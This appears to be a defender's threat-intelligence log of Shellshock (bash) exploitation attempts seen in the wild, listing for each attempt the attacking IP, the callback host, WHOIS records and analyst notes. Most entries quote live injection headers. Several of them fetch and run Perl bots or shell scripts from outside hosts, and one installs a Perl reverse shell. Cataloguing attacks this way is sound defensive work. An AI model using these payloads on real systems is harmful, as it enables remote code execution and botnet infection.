@@ -1,0 +1,504 @@
+# CVE 2014-6271 and 7169, collectively known as "shellshock" is a vulnerability in how the Linux Bourne Again Shell (BASH) interprets and parses environment variables. Namely it allows for code execution in variable definition. This has led to some very interesting and very significant vulnerabilities in a wide variety of Linux software. If it touches the BASH shell it could lead to RCE, Priv. Esc, or DoS conditions.
+# Just like with the rest of the overwatch series (tm) fields:
+#Pitcher: Who threw the payload
+#Catcher: Where is the exploit calling back to in order to get a payload
+#NSLookup (pitcher): Domain Name (or IP address) of pitcher
+#NSLookup (catcher): Domain Name (or IP address) of catcher
+#WHOIS (pitcher): WHOIS data for pitcher
+#WHOIS (catcher): WHOIS data for catcher
+#Payload: what is the payload command(s)
+#Description: what is the payload doing
+#Server: In the downloaded payload is there another server a system contacts post-compromise
+#NSLookup: The post compromise servers' Domain Name (or IP address)
+#WHOIS: WHOIS data for the payload server
+#Notes: anything else interesting
+
+#9/30/14
+
+Pitcher: 61.160.224.130
+Catcher: NA
+NSLookup (pitcher): NX
+NSLookup (catcher): NA
+WHOIS (pitcher):
+61.160.0.0/16
+CHINANET jiangsu province network
+CN
+abuse@jsinfo.net
+AS23650
+WHOIS (catcher): NA
+Payload: T: () { :;}; echo SCAN: 360adlab-scan
+Decription: Vulnerability "touch"
+Server: NA
+NSLookup: NA
+WHOIS: NA
+Notes:
+-"T:" appears to be a custom HTTP Header option with this scanner.
+- No overtly malicious payload noted.
+
+Pitcher: 54.251.83.67
+Catcher: NA
+NSLookup (pitcher): ec2-54-251-83-67.ap-southeast-1.compute.amazonaws.com.
+NSLookup (catcher): NA
+WHOIS (pitcher):
+AMAZON, Inc.
+WHOIS (catcher): NA
+Payload: User-Agent: () { :;}; /bin/bash -c "echo testing9123123"; /bin/uname -a
+Description: Vulnerability "touch", reconaissance
+Server: NA
+NSLookup: NA
+WHOIS: NA
+Notes:
+- Exploit injected into the User-Agent field. doing an echo test followed by a uname -a for system fingerprinting. 
+-Pitcher is coming out of amazon AWS.
+
+Pitcher: 67.227.0.74
+Catcher: 174.143.240.43
+NSLookup (pitcher): NX
+NSLookup (catcher):
+WHOIS (pitcher):
+Colocation America Corporation / Powered Dot Com
+WHOIS (catcher):
+174.143.0.0/16
+Rackspace Hosting
+US
+abuse@rackspace.com
+AS33070, AS10532, AS19994, AS27357
+Payload: User-Agent: () { :;}; /bin/bash -c "wget -P /var/tmp 174.143.240.43/.../x ; perl /var/tmp/x"
+Description: perlbot
+Server: NA
+NSLookup: NA
+WHOIS: NA
+Notes:
+-As of 9/30/14, it appears the catcher no longer has the payload in question. sad face.
+
+Pitcher: 93.103.21.231
+Catcher: taxiairportpop.com
+NSLookup (pitcher): 93-103-21-231.static.t-2.net.
+NSLookup (catcher): 94.199.242.7
+WHOIS (pitcher):
+93.103.0.0/19
+T-2 d.o.o.
+SI
+abuse@t-2.com
+as34779
+WHOIS (catcher):
+94.199.240.0/21
+Alfahosting GmbH
+DE
+abuse@hosteurope.de
+AS20773
+Payload: User-Agent:  () { :;}; /usr/bin/wget http://taxiairportpop.com/s.php?s=http://[targetedsitehere].com[custom uri here]
+NSLookup: NA
+WHOIS: NA
+Notes:
+- a strange touch. wget of the payload in question returns a blank file.
+
+Pitcher: 209.222.148.210
+Catcher: NA
+NSLookup (pitcher): NX
+NSLookup (catcher): NA
+WHOIS (pitcher):
+209.222.128.0/19
+Carpathia Hosting
+US
+hostmaster@cirn.net
+WHOIS (catcher): NA
+Payload: test: () { 0v3r1d3;};echo "Content-type: text/plain"; echo; uname -a;
+Description: vulnerability "touch"
+Server: NA
+NSLookup: NA
+WHOIS: NA
+Notes:
+-This is a vulnerability touch that attempts to output uname -a back to the client.
+-Uses a custom HTTP header option "test"
+-Exploit attempt targets /cgi-sys/entropysearch.cgi IIRC, this is a default cgi item for cpanel.
+
+Pitcher: 83.166.234.133
+Catcher: ad.dipad.biz
+NSLookup (pitcher): NX
+NSLookup (catcher): 83.166.234.186
+WHOIS (pitcher):
+83.166.234.0/24
+S.R.L. MangoHost Network
+MD
+mangohostnetwork@gmail.com
+AS200019
+WHOIS (catcher):
+83.166.234.0/24
+S.R.L. MangoHost Network
+MD
+mangohostnetwork@gmail.com
+AS200019
+Payload: User-Agent: () { :;}; /bin/bash -c "wget -q -O /dev/null http://ad.dipad.biz/test/http://[targetedwebsite].com/"
+Description: vulnerability "touch"
+Server: NA
+NSLookup: NA
+WHOIS: NA
+Notes:
+-another unusual touch. 
+-ad.dipad.biz also no longer appears to be available.
+
+Pitcher: 82.221.105.197
+Catcher: 82.221.105.197
+NSLookup (pitcher): NX
+NSLookup (catcher): NX
+WHOIS (pitcher):
+82.221.96.0/19
+IS-ORANGEWEBSITE
+IS
+abuse@orangewebsite.com
+AS50613
+WHOIS (catcher):
+82.221.96.0/19
+IS-ORANGEWEBSITE
+IS
+abuse@orangewebsite.com
+AS50613
+Payload: User-Agent: () { :;}; /bin/bash -c "wget http://82.221.105.197/bash-count.txt"
+Description: vulnerability "touch"
+Server: NA
+NSLookup: NA
+WHOIS: NA
+Notes:
+- "bash-count.txt" is actually a benign payload. states to contact secscanoptout@gmail.com if you want to be opted out of their scan..
+
+Pitcher: 142.4.215.115
+Catcher: 213.5.67.223
+NSLookup (pitcher): web21.qna.vengit.com
+NSLookup (catcher): hosted-by.as51430.net
+WHOIS (pitcher):
+142.4.192.0/19
+OVH
+CA
+abuse@ovh.ca
+AS16276
+WHOIS (catcher):
+213.5.64.0/21
+ALTUSHOST B. V.
+NL
+abuse@as51430.net
+AS51430
+Payload: User-Agent: () { :;}; /bin/bash -c "cd /tmp;wget http://213.5.67.223/ji;curl -O /tmp/ji http://213.5.67.223/ji ; perl /tmp/ji;rm -rf /tmp/ji"
+Description: perlbot
+Server: NA
+NSLookup: NA
+WHOIS: NA
+Notes:
+-As of 9/30/14, payload server is no longer hosting the payload. sad face
+-Seen OVH and Altus hosting similar payloads/bots in the past relatively "bulletproof" hosting.
+-also saw 173.45.100.18 pitching this.
+
+Pitcher: 70.42.149.69
+Catcher: 74.201.85.69
+NSLookup (pitcher): NX
+NSLookup (catcher): NX
+WHOIS (pitcher):
+70.42.0.0/16
+Internap/PNAP
+US
+abuse@internap.com
+WHOIS (catcher):
+74.201.85.64/26
+engage BDR
+US
+abuse@internap.com
+Payload: User-Agent: () { :;}; /bin/bash -c "wget -O /var/tmp/ec.z 74.201.85.69/ec.z;chmod +x /var/tmp/ec.z;/var/tmp/ec.z;rm -rf /var/tmp/ec.z*"
+Description: vulnerability "touch"
+Server: NA
+NSLookup: NA
+WHOIS: NA
+Notes:
+-ec.z is a plain nginx HTML test page... payload may have possibly been replaced.
+-also saw 66.150.114.30, 70.42.149.70 as a pitcher.
+
+Pitcher: 62.210.75.170
+Catcher: creditstat.ru
+NSLookup (pitcher): 62-210-75-170.rev.poneytelecom.eu.
+NSLookup (catcher): 78.46.37.177
+WHOIS (pitcher):
+62.210.0.0/16
+Online SAS
+FR
+abuse@iliad-enterprises.fr
+AS12876
+WHOIS (catcher): 
+78.46.0.0/15
+Hetzner Online AG
+DE
+abuse@hetzner.de
+Payload: Referer: () { :; }; wget http://creditstat.ru/[b64 encoded block] >> /dev/null
+Description: vulnerability "touch"
+Server: NA
+NSLookup: NA
+WHOIS: NA
+Notes:
+-Interesting payload. does a touch then redirects the output to /dev/null..
+-The b64 section contains the text "TargetName.comshellshocksalt" it is not yet understood why this is significant.
+
+Pitcher: 212.48.68.23
+Catcher: 217.12.204.127
+NSLookup (pitcher): 242051.vps-10.com.
+NSLookup (catcher): NX
+WHOIS (pitcher):
+212.48.68.0/23
+Webfusion Internet Solutions
+GB
+abuse@heartinternet.com
+AS20738
+WHOIS (catcher):
+217.12.204.0/24
+UNICOM LTD
+UA
+abuse@uaservers.net
+Payload: User-Agent: () { :;}; /bin/bash -c "wget http://217.12.204.127/bin"
+Description: unknown
+Server: NA
+NSLookup: NA
+WHOIS: NA
+Notes:
+-Payload no longer exists on the server (404 error)
+-194.54.9.11, 211.20.187.129, 217.17.48.129, 194.186.1.25, 191.241.39.2, 68.235.34.138, 8.26.191.15, 206.191.192.4, 202.93.176.243, 199.27.89.22, 103.28.36.123, 95.128.229.200, 94.180.115.53, 92.39.60.91, 83.96.168.161, 82.80.195.86, 66.241.103.37, 54.225.86.175, 41.221.227.34, 5.135.127.38, 203.162.79.155, 190.151.128.13 also seen pitching this.
+
+Pitcher: 168.235.147.89
+Catcher: NA
+NSLookup (pitcher):
+NSLookup (catcher): NA
+WHOIS (pitcher):
+168.235.144.0/20
+KW-Datacenter
+CA
+noc@kwdatacenter.com
+AS19531
+WHOIS (catcher): NA
+Payload: Referer: () { :;}; echo Thunderstruck
+Description: vulnerability "touch"
+Server: NA
+NSLookup: NA
+WHOIS: NA
+Notes:
+-aside from the hilarious echo statement, this is an exploit touch.
+
+Pitcher: 62.113.208.87
+Catcher: video-vk.ru
+NSLookup (pitcher): NX
+NSLookup (catcher): 62.113.208.87
+WHOIS (pitcher):
+62.113.192.0/18
+23media Gmbh
+DE
+abuse@23media.de
+AS47447
+WHOIS (catcher):
+62.113.192.0/18
+23media Gmbh
+DE
+abuse@23media.de
+AS47447
+Payload: User-Agent: () { :;}; /bin/bash -c "(echo 'GET /logol.php?id3=121607' > /dev/tcp/video-vk.ru/80);(wget -qO- http://video-vk.ru:80/logol.php?id2=121607 &> /dev/null);(curl http://video-vk.ru:80/logol.php?id1=121607 &> /dev/null)" #Your system may be vulnerable to ShellShock. Please visit https://vk.com/define for more information, Referer: () { (a)=>' bash -c 'wget http://video-vk.ru:80/logol.php?id4=121607)'
+Description: vulnerability "touch"
+Server: NA
+NSLookup: NA
+WHOIS: NA
+Notes:
+-tries both variants of shellshock to see if either of them stick.
+-this is just a vulnerability touch.
+
+Pitcher: 46.161.41.142
+Catcher: NA
+NSLookup (pitcher):
+NSLookup (catcher): NA
+WHOIS (pitcher):
+46.161.41.0/24
+datacenterclient31681-net
+RU
+abuse@pinspb.ru
+AS44050
+WHOIS (catcher): NA
+Payload:
+User-Agent: () { :; }; ping -c 46.161.41.142 
+Referer: () { :; }; ping -c 46.161.41.142 
+Cookie: () { :; }; ping -c 46.161.41.142 
+Host: () { :; }; ping -c 46.161.41.142 
+Description: vulnerability "touch"
+Server: NA
+NSLookup: NA
+WHOIS: NA
+Notes:
+-payload pings back to pitcher if exploit is successful. this is just a vulnerability touch.
+
+Pitcher: 94.102.60.177
+Catcher: NA
+NSLookup (pitcher): NX
+NSLookup (catcher): NA
+WHOIS (pitcher):
+94.102.48.0/20
+NL-ECATEL
+NL
+abuse@ecatel.info
+AS29073
+WHOIS (catcher): NA
+Payload: User-Agent: () { x;};echo;echo 123456ololo | md5sum
+Description: vulnerability "touch"
+Server: NA
+NSLookup: NA
+WHOIS: NA
+Notes:
+- looks like a simple vulnerability touch.
+
+Pitcher: 118.192.48.6
+Catcher: NA
+NSLookup (pitcher): NX
+NSLookup (catcher): NA
+WHOIS (pitcher):
+118.192.0.0/16
+China Unicom Hebei Province Network
+WHOIS (catcher): NA
+Payload: User-Agent: () { :; }; echo X-Bash-Test: `echo gVbSiHM19k`;
+Description: vulnerability "touch"
+Server: NA
+NSLookup: NA
+WHOIS: NA
+Notes:
+
+Pitcher: 46.246.34.82
+Catcher: sbd.awardspace.com
+NSLookup (pitcher): anon-34-82.vpn.ipredator.se
+NSLookup (catcher): 83.125.22.143
+WHOIS (pitcher):
+46.246.0.0/17
+Privactually Ltd
+SE
+abuse@portlane.com
+AS42708
+WHOIS (catcher):
+83.124.0.0/14
+Attractsoft - Gmbh
+DE
+noc@eunetworks.com
+AS13237
+Payload:
+Cookie:() { :; }; /usr/bin/curl -o /tmp/auth.pl http://sbd.awardspace.com/auth; /usr/bin/perl /tmp/auth.pl,
+Referer:() { :; }; /usr/bin/curl -o /tmp/auth.pl http://sbd.awardspace.com/auth; /usr/bin/perl /tmp/auth.pl
+Description: Perl Reverse Shell
+Server: 46.246.34.82
+Port: 1992
+NSLookup: anon-34-82.vpn.ipredator.se
+WHOIS:
+46.246.0.0/17
+Privactually Ltd
+SE
+abuse@portlane.com
+AS42708
+Notes:
+-This is literally a perl reverse shell from pentestmonkey re-tooled as a shellshock payload
+
+Pitcher: 210.39.5.15
+Catcher: stablehost.us
+NSLookup (pitcher): meeting.lib.szu.edu.cn
+NSLookup (catcher): NX
+WHOIS (pitcher):
+210.39.0.0 - 210.39.15.255
+Shenzen University
+CN
+abuse@net.eu.cn
+WHOIS (catcher): NA
+Payload: User-Agent: () { :;}; /bin/bash -c "wget http://stablehost.us/bots/regular.bot -O /tmp/sh;curl -o /tmp/sh http://stablehost.us/bots/regular.bot;sh /tmp/sh;rm -rf /tmp/sh"
+Description: shell script payload (unknown)
+Server: NA
+NSLookup: NA
+WHOIS: NA
+Notes:
+-stable.us and bot no longer exist.
+
+Pitcher: 69.38.149.214
+Catcher: NA
+NSLookup (pitcher): NX
+NSLookup (catcher): NA
+WHOIS (pitcher):
+BITSIGHT TECHNOLOGIES BITSIGHT-TECHNOLOGIES (NET-69-38-149-212-1) 69.38.149.212 - 69.38.149.215
+Towerstream I, Inc. TWRS (NET-69-38-128-0-1) 69.38.128.0 - 69.38.255.255
+WHOIS (catcher): NA
+Payload: user-agent: () { :;};echo;echo 'VULNERABLE'|/bin/cat -
+Description: vulnerability "touch"
+Server: NA
+NSLookup: NA
+WHOIS: NA
+Notes:
+
+Pitcher: 195.3.144.110
+Catcher: NA
+NSLookup (pitcher): server-110.colo-00.altnet.lv
+NSLookup (catcher): NA
+WHOIS (pitcher):
+195.3.144.0/22
+RN Data DC
+LV
+rndata.abuse@altnet.lvb
+AS41390
+WHOIS (catcher): NA
+Payload: Referer: () { :;}; echo 'smeegol'
+Description: vulnerability "touch"
+Server: NA
+NSLookup: NA
+WHOIS: NA
+Notes:
+
+Pitcher: 193.11.129.250
+Catcher: psicologoweb.net
+NSLookup (pitcher): c-129-250-vas-l3.cust.mdfnet.se
+NSLookup (catcher): 213.171.190.191
+WHOIS (pitcher):
+193.11.0.0/16
+SUNET C Aggregate
+SE
+abse@mdfnet.se
+AS1653
+WHOIS (catcher):
+213.171.160.0/19
+Seeweb s.r.l.
+IT
+abuse@seeweb.it
+AS12637
+Payload: User-Agent: () { :;}; /bin/bash -c "wget http://psicologoweb.net/mc/s.php/[target website]"
+Description: vulnerability "touch"
+Server: NA
+NSLookup: NA
+WHOIS: NA
+Notes:
+- saw 178.32.181.106 as a pitcher
+
+Pitcher: 188.165.227.201
+Catcher: NA
+NSLookup (pitcher): ns332521.ip-188-165-227.eu
+NSLookup (catcher): NA
+WHOIS (pitcher):
+188.165.0.0/16
+OVH SAS
+FR
+abuse@ovh.net
+AS16276
+WHOIS (catcher): NA
+Payload: Cookie: () { :; }; /bin/ping -c 3 188.165.227.201, Referer: () { :; }; /bin/ping -c 3 188.165.227.201
+Description: vulnerability "touch"
+Server: NA
+NSLookup: NA
+WHOIS: NA
+Notes:
+
+Pitcher:
+Catcher: dprirc.sytes.net
+NSLookup (pitcher): lead.mysitehosted.com
+NSLookup (catcher): NA
+WHOIS (pitcher):
+162.253.144.0/21
+Arvixe LLC
+US
+abuse@arvixe.com
+WHOIS (catcher): NA
+Payload: User-Agent: () { :;}; /bin/bash -c "echo testing9123123"; /usr/bin/wget -O /tmp/b12345 dprirc.sytes.net/bot.txt; /usr/bin/perl /tmp/b12345
+Description: perlbot
+Server: NA
+NSLookup: NA
+WHOIS: NA
+Notes:
+- dprirc.sytes.net appears to no longer exist or is actively being filtered.
